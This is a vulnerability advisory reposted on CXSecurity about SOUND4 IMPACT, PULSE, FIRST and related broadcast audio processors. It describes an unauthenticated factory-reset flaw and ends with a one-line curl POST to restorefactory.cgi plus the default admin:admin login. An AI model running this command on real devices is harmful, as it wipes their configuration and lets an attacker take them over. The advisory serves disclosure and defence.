---
title: SOUND4 IMPACT/FIRST/PULSE/Eco v2.x Unauthenticated Factory Reset
url: https://cxsecurity.com/issue/WLB-2023040010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-03
fetch_date: 2025-10-04T11:29:07.294403
---

# SOUND4 IMPACT/FIRST/PULSE/Eco v2.x Unauthenticated Factory Reset

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SOUND4 IMPACT/FIRST/PULSE/Eco v2.x Unauthenticated Factory Reset** **2023.04.02**  Credit:  **[LiquidWorm](https://cxsecurity.com/author/LiquidWorm/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: SOUND4 IMPACT/FIRST/PULSE/Eco v2.x - Unauthenticated Factory Reset
# Exploit Author: LiquidWorm
Vendor: SOUND4 Ltd.
Product web page: https://www.sound4.com | https://www.sound4.biz
Affected version: FM/HD Radio Processing:
Impact/Pulse/First (Version 2: 1.1/2.15)
Impact/Pulse/First (Version 1: 2.1/1.69)
Impact/Pulse Eco 1.16
Voice Processing:
BigVoice4 1.2
BigVoice2 1.30
Web-Audio Streaming:
Stream 1.1/2.4.29
Watermarking:
WM2 (Kantar Media) 1.11
Summary: The SOUND4 IMPACT introduces an innovative process - mono and
stereo parts of the signal are processed separately to obtain perfect
consistency in terms of both sound and level. Therefore, in moving
reception, when the FM receiver switches from stereo to mono and back to
stereo, the sound variations and changes in level are reduced by over 90%.
In the SOUND4 IMPACT processing chain, the stereo expander can be used
substantially without any limitations.
With its advanced functionalities and impressive versatility, SOUND4
PULSE gives clients the ultimate price - performance ratio, providing
much more than just a processor. Flexible and powerful, it ensures perfect
sound quality and full compatibility with radio broadcasting standards
and can be used simultaneously for FM and HD, DAB, DRM or streaming.
SOUND4 FIRST provides all the most important functionalities you need
in an FM/HD processor and sets the bar high both in terms of performance
and affordability. Designed to deliver a sound of uncompromising quality,
this tool gives you 2-band processing, a digital stereo generator and an
IMPACT Clipper.
Desc: The device allows unauthenticated attackers to visit the unprotected
/usr/cgi-bin/restorefactory.cgi endpoint and reset the device to its factory
default configuration. Once a POST request is made, the device will reboot
with its default settings allowing the attacker to bypass authentication
and take full control of the system.
Tested on: Apache/2.4.25 (Unix)
OpenSSL/1.0.2k
PHP/7.1.1
GNU/Linux 5.10.43 (armv7l)
GNU/Linux 4.9.228 (armv7l)
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
Macedonian Information Security Research and Development Laboratory
Zero Science Lab - https://www.zeroscience.mk - @zeroscience
Advisory ID: ZSL-2022-5742
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5742.php
26.09.2022
--
> curl -kX POST "https://RADIO/cgi-bin/restorefactory.cgi" --data "0x539" \
> sleep 120
#login admin:admin

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040010)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top